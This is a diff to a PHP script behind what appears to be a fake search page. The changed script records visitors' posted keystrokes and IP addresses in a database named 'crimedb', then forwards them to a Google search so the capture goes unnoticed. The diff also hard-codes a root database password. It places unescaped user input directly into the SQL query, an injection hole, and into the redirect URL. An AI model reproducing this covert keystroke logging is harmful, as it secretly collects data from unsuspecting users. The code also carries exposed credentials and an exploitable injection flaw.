@@ -7,8 +7,8 @@
         <?php 
             
             $server = "localhost";
-            $user_db = "fin";
-            $pass_db = "Thewalrus";
+            $user_db = "root";
+            $pass_db = "Th15MyCl@nk3r";
             $db = "crimedb";
 
             $conn = mysqli_connect($server, $user_db, $pass_db, $db);
@@ -18,14 +18,15 @@
             }
 
             $keystrokes = trim($_POST["key"]);
+            $full_search = trim($_POST["searchquery"]);
             $ip = $_SERVER["REMOTE_ADDR"];
 
 
-            $sql = "INSERT INTO ipAndQuerry (letter, ipaddr)
-                    VALUES ('$usernm', '$ip')"; // table ipAndQuerry with columns letter and ipaddr
+            $sql = "INSERT INTO ipAndQuery (letter, ipaddr)
+                    VALUES ('$keystrokes', '$ip')"; // table ipAndQuerry with columns letter and ipaddr
 
             if (mysqli_query($conn, $sql)) {
-                header("Location: https://acme.co")
+                header("Location: https://google.com/search?q=$full_search")
             }
 
             mysqli_close($conn);
